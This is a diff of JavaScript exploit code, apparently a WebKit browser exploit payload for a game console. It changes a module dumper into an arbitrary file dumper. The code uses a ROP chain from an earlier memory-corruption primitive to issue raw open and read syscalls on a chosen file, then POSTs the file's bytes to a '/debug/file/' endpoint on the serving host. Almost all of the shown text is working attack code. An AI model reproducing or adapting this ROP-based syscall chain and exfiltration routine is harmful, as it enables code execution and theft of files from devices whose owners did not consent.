@@ -170,50 +170,80 @@
         debug_log("WebKit Module Base Address: 0x" + webkit_base_addr.toString(16))
         debug_log("ROP Buffer Address: 0x" + rop_buf_addr.toString(16))
 	debug_log("\r")
+	debug_log("Opening and reading file '" + fileToDump + "'...")
+	debug_log("\r")
 
-	// Get the module's base address
+	// Open the file via syscall #005
 
-	var infoBuffer 	= storage.alloc(0x1A8)
-	var retBuffer 	= storage.alloc(0x4)
+	var retBuffer = storage.alloc(0x4)
+	var dirPath   = storage.alloc(0x255)
 
-	write32(infoBuffer, 0x1A8)
+	write_str(dirPath, fileToDump)
 
-	var rop = new RopChain();
+	var r = new RopChain()
+	r.syscall(5, dirPath, 0, 0)
+	r.add('pop rdi')
+	r.add(retBuffer)
+	r.add('mov qword ptr [rdi], rax')
 
-	rop.syscall(608, 0x1b, 0, infoBuffer);
+	r.execute()
 
-	rop.add('pop rdi')
-	rop.add(retBuffer)
-	rop.add('mov qword ptr [rdi], rax')
+	var fd = read32(retBuffer)
 
-	rop.execute()
+	debug_log("File Descriptor: " + fd.toString(10))
 
-	var info = read64(infoBuffer.add(0x110))
-		
-	debug_log('Base:  0x' + info.toString(16))
-	debug_log('\r')
+	if(fd == 2)
+	{
+		debug_log("This file either does not exist or we do not have permission to read it")
+		storage.free(0x255 + 0x4)
+	}
+	else
+	{
+		storage.free(0x255 + 0x4)
 
-	storage.free(0x1A8 + 0x4);
+		// Now we need to read the file via syscall #003
+		retBuffer = storage.alloc(0x4)
+		var fileBuffer = storage.alloc(0x10000)
 
-	// Dump the module
+		r = new RopChain()
 
-	cbuf[0x1E] = 0x2000;
+		r.syscall(3, fd, fileBuffer, 0x10000)
+		r.add('pop rdi')
+		r.add(retBuffer)
+		r.add('mov qword ptr [rdi], rax')
 
-	cbuf[0x14] = info.getLowBitsUnsigned()
-	cbuf[0x15] = info.getHighBitsUnsigned()
+		r.execute()
 
-	var moduleBuffer = rop_buf
+		debug_log("File Size: 0x" + read32(retBuffer).toString(16))
 
-	debug_log("Dumping module...")
+		if(read32(retBuffer) != -1)
+		{
+			debug_log("Dumping file from address 0x" + fileBuffer.toString(16)  + " with size 0x" + read32(retBuffer).toString(16) + "...")
 
-	$.ajax({
-		url: '/debug/bin/libSceNetCtl.bin',
-		type: 'POST',
-		contentType: 'application/octet-stream',
-		data: moduleBuffer,
-		processData: false,
-		async: false
-	});
+			// Set cbuf[0x14] and cbuf[0x15] to fileBuffer, and cbuf[0x1e] to 0x10000
+			cbuf[0x1E] = read32(retBuffer) / 4
+			cbuf[0x14] = fileBuffer.add(0x120).getLowBitsUnsigned()
+			cbuf[0x15] = fileBuffer.add(0x120).getHighBitsUnsigned()
+
+			var fName = fileToDump.substring(fileToDump.lastIndexOf("/") + 1);
+
+			$.ajax({
+                		url: '/debug/file/' + fName,
+               			type: 'POST',
+				contentType: 'application/octet-stream',
+               	 		data: rop_buf,
+            	    		processData: false,
+                		async: false
+        		});
+
+			debug_log("\r")
+			debug_log("Dump successful!")
+		}
+		else
+		{
+			debug_log("We failed to read the file to dump it!")
+		}	
+	}
 
     } catch (ex) {
         document.write("<h1>Error: " + ex + "</h1>");
